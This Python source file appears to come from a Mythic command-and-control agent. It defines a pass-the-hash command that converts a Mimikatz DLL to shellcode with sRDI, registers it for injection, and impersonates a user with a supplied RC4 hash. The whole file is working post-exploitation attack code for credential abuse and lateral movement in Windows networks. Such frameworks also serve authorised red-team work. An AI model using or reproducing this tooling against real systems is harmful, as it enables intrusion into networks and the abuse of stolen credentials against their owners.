from CommandBase import *
import json
from uuid import uuid4
from sRDI import ShellcodeRDI
from os import path
from MythicFileRPC import *


class PTHArguments(TaskArguments):

    def __init__(self, command_line):
        super().__init__(command_line)
        self.args = {
            "credential": CommandParameter(name="Credential", type=ParameterType.Credential_JSON),
            "program": CommandParameter(name="Program to Spawn", type=ParameterType.String, default_value="cmd.exe")
        }

    async def parse_arguments(self):
        if len(self.command_line) == 0:
            raise Exception("PTH requires arguments.")
        if self.command_line[0] != "{":
            raise Exception("Require JSON blob, but got raw command line.")
        self.load_args_from_json_string(self.command_line)
        self.add_arg("pipe_name", str(uuid4()))


class PTHCommand(CommandBase):
    cmd = "pth"
    needs_admin = False
    help_cmd = "pth (modal popup)"
    description = "Use pass-the-hash using an RC4 hash to impersonate the specified user."
    version = 1
    is_exit = False
    is_file_browse = False
    is_process_list = False
    is_download_file = False
    is_upload_file = False
    is_remove_file = False
    author = "@djhohnstein"
    argument_class = PTHArguments
    browser_script = BrowserScript(script_name="unmanaged_injection", author="@djhohnstein")
    attackmapping = []

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        dllFile = path.join(self.agent_code_path, f"mimikatz_{task.callback.architecture}.dll")
        dllBytes = open(dllFile, 'rb').read()
        converted_dll = ShellcodeRDI.ConvertToShellcode(dllBytes, ShellcodeRDI.HashFunctionName("smb_server_wmain"), task.args.get_arg("pipe_name").encode(), 0)
        file_resp = await MythicFileRPC(task).register_file(converted_dll)
        if file_resp.status == MythicStatus.Success:
            task.args.add_arg("loader_stub_id", file_resp.agent_file_id)
        else:
            raise Exception("Failed to register Mimikatz DLL: " + file_resp.error_message)
        return task

    async def process_response(self, response: AgentResponse):
        pass